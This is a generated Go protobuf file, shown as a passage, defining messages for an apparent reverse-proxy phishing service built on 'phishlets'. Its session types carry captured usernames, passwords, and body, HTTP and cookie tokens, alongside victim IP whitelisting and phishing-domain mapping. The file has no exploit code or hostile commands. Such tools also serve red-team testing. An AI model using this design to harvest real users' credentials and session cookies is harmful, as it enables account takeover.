// Code generated by protoc-gen-go. DO NOT EDIT.
// versions:
// 	protoc-gen-go v1.36.9
// 	protoc        v3.12.4
// source: proto/proxy_service.proto

package proto

import (
	protoreflect "google.golang.org/protobuf/reflect/protoreflect"
	protoimpl "google.golang.org/protobuf/runtime/protoimpl"
	reflect "reflect"
	sync "sync"
	unsafe "unsafe"
)

const (
	// Verify that this generated code is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(20 - protoimpl.MinVersion)
	// Verify that runtime/protoimpl is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(protoimpl.MaxVersion - 20)
)

// Request messages
type GetPhishletRequest struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Hostname      string                 `protobuf:"bytes,1,opt,name=hostname,proto3" json:"hostname,omitempty"`
	IsPhishHost   bool                   `protobuf:"varint,2,opt,name=is_phish_host,json=isPhishHost,proto3" json:"is_phish_host,omitempty"` // true for phish host, false for original host
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *GetPhishletRequest) Reset() {
	*x = GetPhishletRequest{}
	mi := &file_proto_proxy_service_proto_msgTypes[0]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *GetPhishletRequest) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*GetPhishletRequest) ProtoMessage() {}

func (x *GetPhishletRequest) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[0]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use GetPhishletRequest.ProtoReflect.Descriptor instead.
func (*GetPhishletRequest) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{0}
}

func (x *GetPhishletRequest) GetHostname() string {
	if x != nil {
		return x.Hostname
	}
	return ""
}

func (x *GetPhishletRequest) GetIsPhishHost() bool {
	if x != nil {
		return x.IsPhishHost
	}
	return false
}

type ValidateSessionRequest struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Hostname      string                 `protobuf:"bytes,1,opt,name=hostname,proto3" json:"hostname,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *ValidateSessionRequest) Reset() {
	*x = ValidateSessionRequest{}
	mi := &file_proto_proxy_service_proto_msgTypes[1]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *ValidateSessionRequest) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*ValidateSessionRequest) ProtoMessage() {}

func (x *ValidateSessionRequest) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[1]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use ValidateSessionRequest.ProtoReflect.Descriptor instead.
func (*ValidateSessionRequest) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{1}
}

func (x *ValidateSessionRequest) GetHostname() string {
	if x != nil {
		return x.Hostname
	}
	return ""
}

type CreateSessionRequest struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	SessionId     string                 `protobuf:"bytes,1,opt,name=session_id,json=sessionId,proto3" json:"session_id,omitempty"`
	PhishletName  string                 `protobuf:"bytes,2,opt,name=phishlet_name,json=phishletName,proto3" json:"phishlet_name,omitempty"`
	LandingUrl    string                 `protobuf:"bytes,3,opt,name=landing_url,json=landingUrl,proto3" json:"landing_url,omitempty"`
	UserAgent     string                 `protobuf:"bytes,4,opt,name=user_agent,json=userAgent,proto3" json:"user_agent,omitempty"`
	RemoteAddr    string                 `protobuf:"bytes,5,opt,name=remote_addr,json=remoteAddr,proto3" json:"remote_addr,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CreateSessionRequest) Reset() {
	*x = CreateSessionRequest{}
	mi := &file_proto_proxy_service_proto_msgTypes[2]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CreateSessionRequest) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CreateSessionRequest) ProtoMessage() {}

func (x *CreateSessionRequest) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[2]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CreateSessionRequest.ProtoReflect.Descriptor instead.
func (*CreateSessionRequest) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{2}
}

func (x *CreateSessionRequest) GetSessionId() string {
	if x != nil {
		return x.SessionId
	}
	return ""
}

func (x *CreateSessionRequest) GetPhishletName() string {
	if x != nil {
		return x.PhishletName
	}
	return ""
}

func (x *CreateSessionRequest) GetLandingUrl() string {
	if x != nil {
		return x.LandingUrl
	}
	return ""
}

func (x *CreateSessionRequest) GetUserAgent() string {
	if x != nil {
		return x.UserAgent
	}
	return ""
}

func (x *CreateSessionRequest) GetRemoteAddr() string {
	if x != nil {
		return x.RemoteAddr
	}
	return ""
}

type UpdateSessionRequest struct {
	state         protoimpl.MessageState     `protogen:"open.v1"`
	SessionId     string                     `protobuf:"bytes,1,opt,name=session_id,json=sessionId,proto3" json:"session_id,omitempty"`
	Username      string                     `protobuf:"bytes,2,opt,name=username,proto3" json:"username,omitempty"`
	Password      string                     `protobuf:"bytes,3,opt,name=password,proto3" json:"password,omitempty"`
	Custom        map[string]string          `protobuf:"bytes,4,rep,name=custom,proto3" json:"custom,omitempty" protobuf_key:"bytes,1,opt,name=key" protobuf_val:"bytes,2,opt,name=value"`
	BodyTokens    map[string]string          `protobuf:"bytes,5,rep,name=body_tokens,json=bodyTokens,proto3" json:"body_tokens,omitempty" protobuf_key:"bytes,1,opt,name=key" protobuf_val:"bytes,2,opt,name=value"`
	HttpTokens    map[string]string          `protobuf:"bytes,6,rep,name=http_tokens,json=httpTokens,proto3" json:"http_tokens,omitempty" protobuf_key:"bytes,1,opt,name=key" protobuf_val:"bytes,2,opt,name=value"`
	CookieTokens  map[string]*CookieTokenMap `protobuf:"bytes,7,rep,name=cookie_tokens,json=cookieTokens,proto3" json:"cookie_tokens,omitempty" protobuf_key:"bytes,1,opt,name=key" protobuf_val:"bytes,2,opt,name=value"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *UpdateSessionRequest) Reset() {
	*x = UpdateSessionRequest{}
	mi := &file_proto_proxy_service_proto_msgTypes[3]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *UpdateSessionRequest) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*UpdateSessionRequest) ProtoMessage() {}

func (x *UpdateSessionRequest) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[3]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use UpdateSessionRequest.ProtoReflect.Descriptor instead.
func (*UpdateSessionRequest) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{3}
}

func (x *UpdateSessionRequest) GetSessionId() string {
	if x != nil {
		return x.SessionId
	}
	return ""
}

func (x *UpdateSessionRequest) GetUsername() string {
	if x != nil {
		return x.Username
	}
	return ""
}

func (x *UpdateSessionRequest) GetPassword() string {
	if x != nil {
		return x.Password
	}
	return ""
}

func (x *UpdateSessionRequest) GetCustom() map[string]string {
	if x != nil {
		return x.Custom
	}
	return nil
}

func (x *UpdateSessionRequest) GetBodyTokens() map[string]string {
	if x != nil {
		return x.BodyTokens
	}
	return nil
}

func (x *UpdateSessionRequest) GetHttpTokens() map[string]string {
	if x != nil {
		return x.HttpTokens
	}
	return nil
}

func (x *UpdateSessionRequest) GetCookieTokens() map[string]*CookieTokenMap {
	if x != nil {
		return x.CookieTokens
	}
	return nil
}

type WhitelistRequest struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	IpAddr        string                 `protobuf:"bytes,1,opt,name=ip_addr,json=ipAddr,proto3" json:"ip_addr,omitempty"`
	PhishletName  string                 `protobuf:"bytes,2,opt,name=phishlet_name,json=phishletName,proto3" json:"phishlet_name,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *WhitelistRequest) Reset() {
	*x = WhitelistRequest{}
	mi := &file_proto_proxy_service_proto_msgTypes[4]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *WhitelistRequest) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*WhitelistRequest) ProtoMessage() {}

func (x *WhitelistRequest) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[4]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use WhitelistRequest.ProtoReflect.Descriptor instead.
func (*WhitelistRequest) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{4}
}

func (x *WhitelistRequest) GetIpAddr() string {
	if x != nil {
		return x.IpAddr
	}
	return ""
}

func (x *WhitelistRequest) GetPhishletName() string {
	if x != nil {
		return x.PhishletName
	}
	return ""
}

type GetSessionIdRequest struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	IpAddr        string                 `protobuf:"bytes,1,opt,name=ip_addr,json=ipAddr,proto3" json:"ip_addr,omitempty"`
	Hostname      string                 `protobuf:"bytes,2,opt,name=hostname,proto3" json:"hostname,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *GetSessionIdRequest) Reset() {
	*x = GetSessionIdRequest{}
	mi := &file_proto_proxy_service_proto_msgTypes[5]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *GetSessionIdRequest) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*GetSessionIdRequest) ProtoMessage() {}

func (x *GetSessionIdRequest) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[5]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use GetSessionIdRequest.ProtoReflect.Descriptor instead.
func (*GetSessionIdRequest) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{5}
}

func (x *GetSessionIdRequest) GetIpAddr() string {
	if x != nil {
		return x.IpAddr
	}
	return ""
}

func (x *GetSessionIdRequest) GetHostname() string {
	if x != nil {
		return x.Hostname
	}
	return ""
}

type WhitelistIPRequest struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	IpAddr        string                 `protobuf:"bytes,1,opt,name=ip_addr,json=ipAddr,proto3" json:"ip_addr,omitempty"`
	SessionId     string                 `protobuf:"bytes,2,opt,name=session_id,json=sessionId,proto3" json:"session_id,omitempty"`
	PhishletName  string                 `protobuf:"bytes,3,opt,name=phishlet_name,json=phishletName,proto3" json:"phishlet_name,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *WhitelistIPRequest) Reset() {
	*x = WhitelistIPRequest{}
	mi := &file_proto_proxy_service_proto_msgTypes[6]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *WhitelistIPRequest) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*WhitelistIPRequest) ProtoMessage() {}

func (x *WhitelistIPRequest) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[6]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use WhitelistIPRequest.ProtoReflect.Descriptor instead.
func (*WhitelistIPRequest) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{6}
}

func (x *WhitelistIPRequest) GetIpAddr() string {
	if x != nil {
		return x.IpAddr
	}
	return ""
}

func (x *WhitelistIPRequest) GetSessionId() string {
	if x != nil {
		return x.SessionId
	}
	return ""
}

func (x *WhitelistIPRequest) GetPhishletName() string {
	if x != nil {
		return x.PhishletName
	}
	return ""
}

// Response messages
type GetPhishletResponse struct {
	state          protoimpl.MessageState `protogen:"open.v1"`
	Found          bool                   `protobuf:"varint,1,opt,name=found,proto3" json:"found,omitempty"`
	Phishlet       *Phishlet              `protobuf:"bytes,2,opt,name=phishlet,proto3" json:"phishlet,omitempty"`
	PhishDomain    string                 `protobuf:"bytes,3,opt,name=phish_domain,json=phishDomain,proto3" json:"phish_domain,omitempty"`
	PhishSubdomain string                 `protobuf:"bytes,4,opt,name=phish_subdomain,json=phishSubdomain,proto3" json:"phish_subdomain,omitempty"`
	unknownFields  protoimpl.UnknownFields
	sizeCache      protoimpl.SizeCache
}

func (x *GetPhishletResponse) Reset() {
	*x = GetPhishletResponse{}
	mi := &file_proto_proxy_service_proto_msgTypes[7]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *GetPhishletResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*GetPhishletResponse) ProtoMessage() {}

func (x *GetPhishletResponse) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[7]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use GetPhishletResponse.ProtoReflect.Descriptor instead.
func (*GetPhishletResponse) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{7}
}

func (x *GetPhishletResponse) GetFound() bool {
	if x != nil {
		return x.Found
	}
	return false
}

func (x *GetPhishletResponse) GetPhishlet() *Phishlet {
	if x != nil {
		return x.Phishlet
	}
	return nil
}

func (x *GetPhishletResponse) GetPhishDomain() string {
	if x != nil {
		return x.PhishDomain
	}
	return ""
}

func (x *GetPhishletResponse) GetPhishSubdomain() string {
	if x != nil {
		return x.PhishSubdomain
	}
	return ""
}

type ValidateSessionResponse struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	ShouldHandle  bool                   `protobuf:"varint,1,opt,name=should_handle,json=shouldHandle,proto3" json:"should_handle,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *ValidateSessionResponse) Reset() {
	*x = ValidateSessionResponse{}
	mi := &file_proto_proxy_service_proto_msgTypes[8]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *ValidateSessionResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*ValidateSessionResponse) ProtoMessage() {}

func (x *ValidateSessionResponse) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[8]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use ValidateSessionResponse.ProtoReflect.Descriptor instead.
func (*ValidateSessionResponse) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{8}
}

func (x *ValidateSessionResponse) GetShouldHandle() bool {
	if x != nil {
		return x.ShouldHandle
	}
	return false
}

type CreateSessionResponse struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Success       bool                   `protobuf:"varint,1,opt,name=success,proto3" json:"success,omitempty"`
	Error         string                 `protobuf:"bytes,2,opt,name=error,proto3" json:"error,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CreateSessionResponse) Reset() {
	*x = CreateSessionResponse{}
	mi := &file_proto_proxy_service_proto_msgTypes[9]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CreateSessionResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CreateSessionResponse) ProtoMessage() {}

func (x *CreateSessionResponse) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[9]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CreateSessionResponse.ProtoReflect.Descriptor instead.
func (*CreateSessionResponse) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{9}
}

func (x *CreateSessionResponse) GetSuccess() bool {
	if x != nil {
		return x.Success
	}
	return false
}

func (x *CreateSessionResponse) GetError() string {
	if x != nil {
		return x.Error
	}
	return ""
}

type UpdateSessionResponse struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Success       bool                   `protobuf:"varint,1,opt,name=success,proto3" json:"success,omitempty"`
	Error         string                 `protobuf:"bytes,2,opt,name=error,proto3" json:"error,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *UpdateSessionResponse) Reset() {
	*x = UpdateSessionResponse{}
	mi := &file_proto_proxy_service_proto_msgTypes[10]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *UpdateSessionResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*UpdateSessionResponse) ProtoMessage() {}

func (x *UpdateSessionResponse) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[10]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use UpdateSessionResponse.ProtoReflect.Descriptor instead.
func (*UpdateSessionResponse) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{10}
}

func (x *UpdateSessionResponse) GetSuccess() bool {
	if x != nil {
		return x.Success
	}
	return false
}

func (x *UpdateSessionResponse) GetError() string {
	if x != nil {
		return x.Error
	}
	return ""
}

type WhitelistResponse struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	IsWhitelisted bool                   `protobuf:"varint,1,opt,name=is_whitelisted,json=isWhitelisted,proto3" json:"is_whitelisted,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *WhitelistResponse) Reset() {
	*x = WhitelistResponse{}
	mi := &file_proto_proxy_service_proto_msgTypes[11]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *WhitelistResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*WhitelistResponse) ProtoMessage() {}

func (x *WhitelistResponse) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[11]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use WhitelistResponse.ProtoReflect.Descriptor instead.
func (*WhitelistResponse) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{11}
}

func (x *WhitelistResponse) GetIsWhitelisted() bool {
	if x != nil {
		return x.IsWhitelisted
	}
	return false
}

type GetSessionIdResponse struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Found         bool                   `protobuf:"varint,1,opt,name=found,proto3" json:"found,omitempty"`
	SessionId     string                 `protobuf:"bytes,2,opt,name=session_id,json=sessionId,proto3" json:"session_id,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *GetSessionIdResponse) Reset() {
	*x = GetSessionIdResponse{}
	mi := &file_proto_proxy_service_proto_msgTypes[12]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *GetSessionIdResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*GetSessionIdResponse) ProtoMessage() {}

func (x *GetSessionIdResponse) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[12]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use GetSessionIdResponse.ProtoReflect.Descriptor instead.
func (*GetSessionIdResponse) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{12}
}

func (x *GetSessionIdResponse) GetFound() bool {
	if x != nil {
		return x.Found
	}
	return false
}

func (x *GetSessionIdResponse) GetSessionId() string {
	if x != nil {
		return x.SessionId
	}
	return ""
}

type WhitelistIPResponse struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Success       bool                   `protobuf:"varint,1,opt,name=success,proto3" json:"success,omitempty"`
	Error         string                 `protobuf:"bytes,2,opt,name=error,proto3" json:"error,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *WhitelistIPResponse) Reset() {
	*x = WhitelistIPResponse{}
	mi := &file_proto_proxy_service_proto_msgTypes[13]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *WhitelistIPResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*WhitelistIPResponse) ProtoMessage() {}

func (x *WhitelistIPResponse) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[13]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use WhitelistIPResponse.ProtoReflect.Descriptor instead.
func (*WhitelistIPResponse) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{13}
}

func (x *WhitelistIPResponse) GetSuccess() bool {
	if x != nil {
		return x.Success
	}
	return false
}

func (x *WhitelistIPResponse) GetError() string {
	if x != nil {
		return x.Error
	}
	return ""
}

// Data structures
type Phishlet struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Name          string                 `protobuf:"bytes,1,opt,name=name,proto3" json:"name,omitempty"`
	Author        string                 `protobuf:"bytes,2,opt,name=author,proto3" json:"author,omitempty"`
	ProxyHosts    []*ProxyHost           `protobuf:"bytes,3,rep,name=proxy_hosts,json=proxyHosts,proto3" json:"proxy_hosts,omitempty"`
	SubFilters    []*SubFilter           `protobuf:"bytes,4,rep,name=sub_filters,json=subFilters,proto3" json:"sub_filters,omitempty"`
	AuthTokens    []*AuthToken           `protobuf:"bytes,5,rep,name=auth_tokens,json=authTokens,proto3" json:"auth_tokens,omitempty"`
	AuthUrls      []*AuthUrl             `protobuf:"bytes,6,rep,name=auth_urls,json=authUrls,proto3" json:"auth_urls,omitempty"`
	RedirectUrl   string                 `protobuf:"bytes,7,opt,name=redirect_url,json=redirectUrl,proto3" json:"redirect_url,omitempty"`
	IsTemplate    bool                   `protobuf:"varint,8,opt,name=is_template,json=isTemplate,proto3" json:"is_template,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *Phishlet) Reset() {
	*x = Phishlet{}
	mi := &file_proto_proxy_service_proto_msgTypes[14]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *Phishlet) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*Phishlet) ProtoMessage() {}

func (x *Phishlet) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[14]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use Phishlet.ProtoReflect.Descriptor instead.
func (*Phishlet) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{14}
}

func (x *Phishlet) GetName() string {
	if x != nil {
		return x.Name
	}
	return ""
}

func (x *Phishlet) GetAuthor() string {
	if x != nil {
		return x.Author
	}
	return ""
}

func (x *Phishlet) GetProxyHosts() []*ProxyHost {
	if x != nil {
		return x.ProxyHosts
	}
	return nil
}

func (x *Phishlet) GetSubFilters() []*SubFilter {
	if x != nil {
		return x.SubFilters
	}
	return nil
}

func (x *Phishlet) GetAuthTokens() []*AuthToken {
	if x != nil {
		return x.AuthTokens
	}
	return nil
}

func (x *Phishlet) GetAuthUrls() []*AuthUrl {
	if x != nil {
		return x.AuthUrls
	}
	return nil
}

func (x *Phishlet) GetRedirectUrl() string {
	if x != nil {
		return x.RedirectUrl
	}
	return ""
}

func (x *Phishlet) GetIsTemplate() bool {
	if x != nil {
		return x.IsTemplate
	}
	return false
}

type ProxyHost struct {
	state          protoimpl.MessageState `protogen:"open.v1"`
	PhishSubdomain string                 `protobuf:"bytes,1,opt,name=phish_subdomain,json=phishSubdomain,proto3" json:"phish_subdomain,omitempty"`
	OrigSubdomain  string                 `protobuf:"bytes,2,opt,name=orig_subdomain,json=origSubdomain,proto3" json:"orig_subdomain,omitempty"`
	Domain         string                 `protobuf:"bytes,3,opt,name=domain,proto3" json:"domain,omitempty"`
	HandleSession  string                 `protobuf:"bytes,4,opt,name=handle_session,json=handleSession,proto3" json:"handle_session,omitempty"`
	IsLanding      bool                   `protobuf:"varint,5,opt,name=is_landing,json=isLanding,proto3" json:"is_landing,omitempty"`
	AutoFilter     bool                   `protobuf:"varint,6,opt,name=auto_filter,json=autoFilter,proto3" json:"auto_filter,omitempty"`
	unknownFields  protoimpl.UnknownFields
	sizeCache      protoimpl.SizeCache
}

func (x *ProxyHost) Reset() {
	*x = ProxyHost{}
	mi := &file_proto_proxy_service_proto_msgTypes[15]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *ProxyHost) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*ProxyHost) ProtoMessage() {}

func (x *ProxyHost) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[15]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use ProxyHost.ProtoReflect.Descriptor instead.
func (*ProxyHost) Descriptor() ([]byte, []int) {
	return file_proto_proxy_service_proto_rawDescGZIP(), []int{15}
}

func (x *ProxyHost) GetPhishSubdomain() string {
	if x != nil {
		return x.PhishSubdomain
	}
	return ""
}

func (x *ProxyHost) GetOrigSubdomain() string {
	if x != nil {
		return x.OrigSubdomain
	}
	return ""
}

func (x *ProxyHost) GetDomain() string {
	if x != nil {
		return x.Domain
	}
	return ""
}

func (x *ProxyHost) GetHandleSession() string {
	if x != nil {
		return x.HandleSession
	}
	return ""
}

func (x *ProxyHost) GetIsLanding() bool {
	if x != nil {
		return x.IsLanding
	}
	return false
}

func (x *ProxyHost) GetAutoFilter() bool {
	if x != nil {
		return x.AutoFilter
	}
	return false
}

type SubFilter struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Hostname      string                 `protobuf:"bytes,1,opt,name=hostname,proto3" json:"hostname,omitempty"`
	Rules         []*SubFilterRule       `protobuf:"bytes,2,rep,name=rules,proto3" json:"rules,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *SubFilter) Reset() {
	*x = SubFilter{}
	mi := &file_proto_proxy_service_proto_msgTypes[16]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *SubFilter) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*SubFilter) ProtoMessage() {}

func (x *SubFilter) ProtoReflect() protoreflect.Message {
	mi := &file_proto_proxy_service_proto_msgTypes[16]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
